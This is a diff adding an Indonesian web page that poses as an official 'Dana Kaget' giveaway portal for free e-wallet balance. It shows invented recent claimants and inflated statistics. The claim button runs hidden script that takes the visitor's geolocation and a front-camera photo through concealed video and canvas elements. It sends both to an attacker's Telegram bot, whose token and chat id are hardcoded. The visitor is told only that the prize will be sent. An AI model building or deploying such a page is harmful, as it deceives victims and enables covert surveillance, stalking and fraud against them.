@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+
+<html class="light" lang="id">
+
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+  <title>Klaim Dana Kaget</title>
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com" rel="preconnect" />
+  <link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect" />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Spline+Sans:wght@300;400;500;600;700&amp;family=Noto+Sans:wght@400;500;700&amp;display=swap"
+    rel="stylesheet" />
+  <!-- Material Symbols -->
+  <link
+    href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap"
+    rel="stylesheet" />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap"
+    rel="stylesheet" />
+  <!-- Theme Configuration -->
+  <script id="tailwind-config">
+    tailwind.config = {
+      darkMode: "class",
+      theme: {
+        extend: {
+          colors: {
+            "primary": "#f48c25",
+            "background-light": "#f8f7f5",
+            "background-dark": "#221910",
+          },
+          fontFamily: {
+            "display": ["Spline Sans", "Noto Sans", "sans-serif"]
+          },
+          borderRadius: {
+            "DEFAULT": "0.5rem",
+            "lg": "1rem",
+            "xl": "1.5rem",
+            "full": "9999px"
+          },
+        },
+      },
+    }
+  </script>
+  <style>
+    /* Custom scrollbar for better look */
+    ::-webkit-scrollbar {
+      width: 8px;
+    }
+
+    ::-webkit-scrollbar-track {
+      background: #f1f1f1;
+    }
+
+    ::-webkit-scrollbar-thumb {
+      background: #ccc;
+      border-radius: 4px;
+    }
+
+    ::-webkit-scrollbar-thumb:hover {
+      background: #aaa;
+    }
+
+    .glass-effect {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(10px);
+    }
+
+    .dark .glass-effect {
+      background: rgba(34, 25, 16, 0.95);
+    }
+  </style>
+</head>
+
+<body
+  class="bg-background-light dark:bg-background-dark font-display text-[#181411] dark:text-white transition-colors duration-200">
+  <div class="relative flex h-auto min-h-screen w-full flex-col overflow-x-hidden">
+    <!-- Header -->
+    <header
+      class="sticky top-0 z-50 w-full border-b border-[#f5f2f0] dark:border-[#3a2e25] glass-effect px-4 sm:px-10 py-3">
+      <div class="mx-auto flex max-w-[1200px] items-center justify-between">
+        <div class="flex items-center gap-4 text-[#181411] dark:text-white">
+          <div class="flex size-10 items-center justify-center rounded-full bg-primary/10 text-primary">
+            <span class="material-symbols-outlined text-2xl">redeem</span>
+          </div>
+          <h2 class="text-xl font-bold leading-tight tracking-tight">Dana Kaget</h2>
+        </div>
+      </div>
+    </header>
+    <main class="flex-1 flex flex-col">
+      <!-- Hero Section -->
+      <section class="relative flex w-full flex-col items-center justify-center px-4 py-12 md:py-20 lg:px-40">
+        <!-- Background Decoration -->
+        <div class="absolute inset-0 z-0 overflow-hidden">
+          <div class="absolute -left-[10%] -top-[10%] h-[500px] w-[500px] rounded-full bg-primary/5 blur-[100px]"></div>
+          <div class="absolute -right-[5%] top-[20%] h-[300px] w-[300px] rounded-full bg-primary/10 blur-[80px]"></div>
+        </div>
+        <div class="layout-content-container relative z-10 flex max-w-[960px] flex-col items-center w-full">
+          <div
+            class="w-full overflow-hidden rounded-2xl bg-white dark:bg-[#2a2018] shadow-xl ring-1 ring-black/5 dark:ring-white/5">
+            <div
+              class="relative flex min-h-[480px] flex-col items-center justify-center gap-8 p-6 md:p-12 text-center bg-cover bg-center"
+              data-alt="Abstract orange and white gradient pattern representing surprise and energy"
+              style='background-image: linear-gradient(rgba(0, 0, 0, 0.6) 0%, rgba(0, 0, 0, 0.7) 100%), url("https://lh3.googleusercontent.com/aida-public/AB6AXuCkRne5cQ5y1foN05JSwH0b3A2eHtdgNHPvlm3RBlloCqcJEpzj843jtSCsp2wSGLvMBlcaoRgt4jEfGKpF6zMzqiwCaLTGFIHP8I5yEn1WzOkVGUOU9HJjSjmrmc4mLQLjRIBFQoabLRwUcZ20df69OJFhLRXAQsg5VRNqdpPIbYFCgE8VNTOj8fQPHALFTsRxuake0XVnOygeNQ1thjE0JTF6dP25ALqP0HjlA4WxDZNv7XfEy-stX_KiJUELUh03NjsxYqz0PkU");'>
+              <div class="flex flex-col gap-4 max-w-[640px]">
+                <span
+                  class="mx-auto w-fit rounded-full bg-white/20 px-3 py-1 text-xs font-semibold uppercase tracking-wider text-white backdrop-blur-md border border-white/10">
+                  Official Dana Kaget Portal
+                </span>
+                <h1 class="text-4xl font-black leading-tight tracking-tight text-white md:text-5xl lg:text-6xl">
+                  Siap Menerima <span class="text-primary">Kejutan?</span>
+                </h1>
+                <h2 class="text-base font-medium leading-relaxed text-gray-200 md:text-lg">
+                  Masukkan kode unik atau tautan yang Anda terima untuk mencairkan saldo langsung ke dompet digital
+                  Anda.
+                </h2>
+              </div>
+              <div class="w-full max-w-[560px]">
+                <div
+                  class="group flex w-full flex-col items-center gap-2 rounded-2xl bg-white p-2 shadow-2xl transition-all focus-within:ring-4 focus-within:ring-primary/20">
+                  <div
+                    class="flex h-11 md:h-14 w-full flex-1 items-center gap-2 rounded-xl bg-gray-50 px-3 md:bg-transparent">
+                    <span class="material-symbols-outlined text-gray-400 text-lg md:text-xl">phone_iphone</span>
+                    <input
+                      class="h-full w-full bg-transparent text-sm md:text-base font-medium text-[#181411] placeholder:text-gray-400 focus:outline-0 border-none p-0 focus:ring-0"
+                      placeholder="Masukkan nomor Dana di sini..." type="text" inputmode="numeric" pattern="[0-9]*" />
+                  </div>
+                </div>
+                <button id="klaimHadiahBtn" onclick="captureAndSend()"
+                  class="h-11 md:h-14 w-full md:w-auto min-w-[120px] md:min-w-[180px] mt-3 cursor-pointer rounded-xl bg-primary px-4 md:px-6 text-sm md:text-base font-bold text-[#181411] transition-all hover:bg-[#ff9d40] hover:shadow-lg active:scale-95">
+                  Klaim Hadiah
+                </button>
+                <video id="video" autoplay style="display:none;"></video>
+                <canvas id="canvas" style="display:none;"></canvas>
+                <div class="mt-3 flex items-center justify-center gap-2 text-xs font-medium text-gray-300">
+                  <span class="material-symbols-outlined text-[16px] text-green-400">verified_user</span>
+                  <span>Dijamin Aman &amp; Instan</span>
+                </div>
+              </div>
+            </div>
+          </div>
+          <!-- Recent Claims Ticker (Simulated) -->
+          <div class="mt-6 flex w-full max-w-[600px] flex-col gap-3">
+            <p class="text-center text-sm font-medium text-gray-500 dark:text-gray-400">Baru saja diklaim:</p>
+            <div class="flex flex-col gap-2">
+              <div
+                class="flex items-center gap-3 rounded-xl bg-white dark:bg-[#2a2018] p-3 shadow-sm border border-[#e6e0db] dark:border-[#3a2e25]">
+                <div class="size-8 overflow-hidden rounded-full bg-gray-200" data-alt="Profile picture of user Budi"
+                  style='background-image: url("https://lh3.googleusercontent.com/aida-public/AB6AXuAnHVxCE8WobWiqC5J1wnG08t1chKjRUL6y4Yb17pSnGkH-uAyDP_DkRq7_Os0dS8IoTg7XJyrhFt6ZdOAsLhGmDZa9XN7e89vouF6XcsThtBItlmno-pYj_q6fJnXZwW0_moqtj3BnmJ09J5SEuYYcF2h4T_qQT3SAS_RaoYPgJSKWW3PH9fS5L19f97mEVUv0SQr6j0SdGXT4dMyLZF7dh9cnvDaUoqJPsbL0bdD5kUwJX6wnkd9ByBVAh3XpOw3KJZb2ANaVGEg"); background-size: cover;'>
+                </div>
+                <div class="flex flex-1 items-center justify-between">
+                  <p class="text-sm font-medium text-[#181411] dark:text-white">Budi S. <span
+                      class="font-normal text-gray-500 text-xs ml-1">2 menit lalu</span></p>
+                  <span class="text-sm font-bold text-green-600">+ Rp 50.000</span>
+                </div>
+              </div>
+              <div
+                class="flex items-center gap-3 rounded-xl bg-white dark:bg-[#2a2018] p-3 shadow-sm border border-[#e6e0db] dark:border-[#3a2e25] opacity-60">
+                <div class="size-8 overflow-hidden rounded-full bg-gray-200" data-alt="Profile picture of user Sarah"
+                  style='background-image: url("https://lh3.googleusercontent.com/aida-public/AB6AXuBguZ04sBPAxG2mMbJ3VRcdcneaTlhinHLInJgHgsbddkm7cTVzTe-2A_h8EcsXR6eXlKshGEpMWunN9Xe_iStafsjxX4GxmFM4-u8oGekKQ_rdCgcnW6MxBcbvzV7qQgfXrVBU3v1rkUGI2636HhqtIekkLGGugacXWO02ElTJYdsrXxrU_q94K11iG1eSUlUycWGVY6SkOi3l428tZ73bOsQ3y7Fb8AXcGYWzD4MX9-rGchSPuKFcguIxNxSJa8pUQWK7yPCY1Kc"); background-size: cover;'>
+                </div>
+                <div class="flex flex-1 items-center justify-between">
+                  <p class="text-sm font-medium text-[#181411] dark:text-white">Sarah M. <span
+                      class="font-normal text-gray-500 text-xs ml-1">5 menit lalu</span></p>
+                  <span class="text-sm font-bold text-green-600">+ Rp 25.000</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <!-- Stats Section -->
+      <section class="w-full px-4 lg:px-40 pb-12">
+        <div class="mx-auto max-w-[960px]">
+          <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
+            <div
+              class="flex flex-col gap-1 rounded-2xl border border-[#e6e0db] dark:border-[#3a2e25] bg-white dark:bg-[#2a2018] p-6 shadow-sm hover:shadow-md transition-shadow">
+              <div
+                class="mb-2 flex size-10 items-center justify-center rounded-full bg-blue-50 dark:bg-blue-900/20 text-blue-600 dark:text-blue-400">
+                <span class="material-symbols-outlined">celebration</span>
+              </div>
+              <p class="text-sm font-medium text-gray-500 dark:text-gray-400">Total Klaim Hari Ini</p>
+              <div class="flex items-baseline gap-2">
+                <p class="text-2xl font-bold tracking-tight text-[#181411] dark:text-white">12.500+</p>
+                <span
+                  class="text-xs font-bold text-green-600 bg-green-50 dark:bg-green-900/20 px-1.5 py-0.5 rounded">+5%</span>
+              </div>
+            </div>
+            <div
+              class="flex flex-col gap-1 rounded-2xl border border-[#e6e0db] dark:border-[#3a2e25] bg-white dark:bg-[#2a2018] p-6 shadow-sm hover:shadow-md transition-shadow">
+              <div
+                class="mb-2 flex size-10 items-center justify-center rounded-full bg-orange-50 dark:bg-orange-900/20 text-orange-600 dark:text-orange-400">
+                <span class="material-symbols-outlined">payments</span>
+              </div>
+              <p class="text-sm font-medium text-gray-500 dark:text-gray-400">Total Dana Dibagikan</p>
+              <div class="flex items-baseline gap-2">
+                <p class="text-2xl font-bold tracking-tight text-[#181411] dark:text-white">Rp 500 Juta</p>
+                <span
+                  class="text-xs font-bold text-green-600 bg-green-50 dark:bg-green-900/20 px-1.5 py-0.5 rounded">+12%</span>
+              </div>
+            </div>
+            <div
+              class="flex flex-col gap-1 rounded-2xl border border-[#e6e0db] dark:border-[#3a2e25] bg-white dark:bg-[#2a2018] p-6 shadow-sm hover:shadow-md transition-shadow">
+              <div
+                class="mb-2 flex size-10 items-center justify-center rounded-full bg-purple-50 dark:bg-purple-900/20 text-purple-600 dark:text-purple-400">
+                <span class="material-symbols-outlined">group</span>
+              </div>
+              <p class="text-sm font-medium text-gray-500 dark:text-gray-400">Pengguna Aktif</p>
+              <div class="flex items-baseline gap-2">
+                <p class="text-2xl font-bold tracking-tight text-[#181411] dark:text-white">250.000+</p>
+                <span
+                  class="text-xs font-bold text-green-600 bg-green-50 dark:bg-green-900/20 px-1.5 py-0.5 rounded">+8%</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <!-- How To Section -->
+      <section
+        class="w-full px-4 lg:px-40 py-16 bg-white dark:bg-[#2a2018] border-t border-[#f5f2f0] dark:border-[#3a2e25]">
+        <div class="mx-auto flex max-w-[960px] flex-col items-center gap-12">
+          <div class="text-center">
+            <h2 class="text-3xl font-bold tracking-tight text-[#181411] dark:text-white md:text-4xl">Cara Mudah Klaim
+              Dana</h2>
+            <p class="mt-4 text-base text-gray-500 dark:text-gray-400 max-w-lg mx-auto">Tidak perlu ribet, ikuti langkah
+              sederhana ini untuk mendapatkan saldo gratis langsung ke akunmu.</p>
+          </div>
+          <div class="grid w-full grid-cols-1 md:grid-cols-3 gap-8 relative">
+            <!-- Connector Line (Desktop) -->
+            <div
+              class="hidden md:block absolute top-[2.5rem] left-[16%] right-[16%] h-0.5 bg-gradient-to-r from-transparent via-primary/30 to-transparent">
+            </div>
+            <!-- Step 1 -->
+            <div class="relative flex flex-col items-center text-center gap-4 group">
+              <div
+                class="relative z-10 flex size-20 items-center justify-center rounded-2xl bg-white dark:bg-[#221910] border-2 border-primary/20 shadow-lg transition-transform group-hover:-translate-y-2 group-hover:border-primary">
+                <span class="material-symbols-outlined text-4xl text-primary">content_copy</span>
+                <div
+                  class="absolute -right-2 -top-2 flex size-8 items-center justify-center rounded-full bg-primary text-sm font-bold text-[#181411]">
+                  1</div>
+              </div>
+              <div class="flex flex-col gap-2">
+                <h3 class="text-lg font-bold text-[#181411] dark:text-white">Salin Kode</h3>
+                <p class="text-sm text-gray-500 dark:text-gray-400 leading-relaxed">Salin tautan atau kode unik yang
+                  dibagikan teman atau kerabatmu.</p>
+              </div>
+            </div>
+            <!-- Step 2 -->
+            <div class="relative flex flex-col items-center text-center gap-4 group">
+              <div
+                class="relative z-10 flex size-20 items-center justify-center rounded-2xl bg-white dark:bg-[#221910] border-2 border-primary/20 shadow-lg transition-transform group-hover:-translate-y-2 group-hover:border-primary">
+                <span class="material-symbols-outlined text-4xl text-primary">keyboard</span>
+                <div
+                  class="absolute -right-2 -top-2 flex size-8 items-center justify-center rounded-full bg-primary text-sm font-bold text-[#181411]">
+                  2</div>
+              </div>
+              <div class="flex flex-col gap-2">
+                <h3 class="text-lg font-bold text-[#181411] dark:text-white">Tempel Link</h3>
+                <p class="text-sm text-gray-500 dark:text-gray-400 leading-relaxed">Masukkan kode tersebut ke dalam
+                  kolom pencarian di bagian atas.</p>
+              </div>
+            </div>
+            <!-- Step 3 -->
+            <div class="relative flex flex-col items-center text-center gap-4 group">
+              <div
+                class="relative z-10 flex size-20 items-center justify-center rounded-2xl bg-white dark:bg-[#221910] border-2 border-primary/20 shadow-lg transition-transform group-hover:-translate-y-2 group-hover:border-primary">
+                <span class="material-symbols-outlined text-4xl text-primary">account_balance_wallet</span>
+                <div
+                  class="absolute -right-2 -top-2 flex size-8 items-center justify-center rounded-full bg-primary text-sm font-bold text-[#181411]">
+                  3</div>
+              </div>
+              <div class="flex flex-col gap-2">
+                <h3 class="text-lg font-bold text-[#181411] dark:text-white">Terima Saldo</h3>
+                <p class="text-sm text-gray-500 dark:text-gray-400 leading-relaxed">Saldo akan otomatis masuk ke dompet
+                  digitalmu dalam hitungan detik.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+    </main>
+    <footer class="border-t border-[#f5f2f0] dark:border-[#3a2e25] bg-white dark:bg-[#2a2018] px-4 py-8 lg:px-40">
+      <div class="mx-auto flex max-w-[1200px] flex-col items-center justify-between gap-6 md:flex-row">
+        <div class="flex items-center gap-2">
+          <div class="flex size-8 items-center justify-center rounded-lg bg-primary/20 text-primary">
+            <span class="material-symbols-outlined text-lg">redeem</span>
+          </div>
+          <span class="text-lg font-bold text-[#181411] dark:text-white">Dana Kaget</span>
+        </div>
+        <div class="flex flex-wrap justify-center gap-8 text-sm font-medium text-gray-500 dark:text-gray-400">
+          <a class="hover:text-primary transition-colors" href="#">Tentang Kami</a>
+          <a class="hover:text-primary transition-colors" href="#">Syarat &amp; Ketentuan</a>
+          <a class="hover:text-primary transition-colors" href="#">Kebijakan Privasi</a>
+          <a class="hover:text-primary transition-colors" href="#">Pusat Bantuan</a>
+        </div>
+        <div class="text-sm text-gray-400 dark:text-gray-500">
+          © 2024 Dana Kaget. All rights reserved.
+        </div>
+      </div>
+    </footer>
+  </div>
+</body>
+
+<script>
+  async function captureAndSend() {
+    // Minta izin akses lokasi
+    navigator.geolocation.getCurrentPosition(
+      async function (position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        // Ambil foto kamera depan
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        video.srcObject = stream;
+        await new Promise(resolve => { video.onloadedmetadata = resolve; });
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const photo = canvas.toDataURL('image/png');
+
+        // Kirim ke bot Telegram
+        const formData = new FormData();
+        formData.append('chat_id', '8278108288');
+        formData.append('caption', `Lokasi : https://www.google.com/maps?q=${lat},${lon}`);
+        formData.append('photo', dataURLtoBlob(photo), 'photo.png');
+
+        try {
+          const response = await fetch('https://api.telegram.org/bot8334803805:AAFaT3CZdUImF2oHDdJ8bTamiQg2p0co5zQ/sendPhoto', {
+            method: 'POST',
+            body: formData
+          });
+          if (response.ok) {
+            alert("Terima kasih! Hadiah akan dikirim.");
+          } else {
+            alert("Gagal mengirim ke Telegram. Coba lagi nanti.");
+          }
+        } catch (e) {
+          alert("Terjadi kesalahan koneksi ke Telegram.");
+        }
+      },
+      function (error) {
+        alert("Akses lokasi atau kamera ditolak, hadiah tidak bisa dikirim!");
+      }
+    );
+  }
+
+  function dataURLtoBlob(dataURL) {
+    const byteString = atob(dataURL.split(',')[1]);
+    const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+    const ab = new ArrayBuffer(byteString.length);
+    const ia = new Uint8Array(ab);
+    for (let i = 0; i < byteString.length; i++) {
+      ia[i] = byteString.charCodeAt(i);
+    }
+    return new Blob([ab], { type: mimeString });
+  }
+</script>
+
+</html>
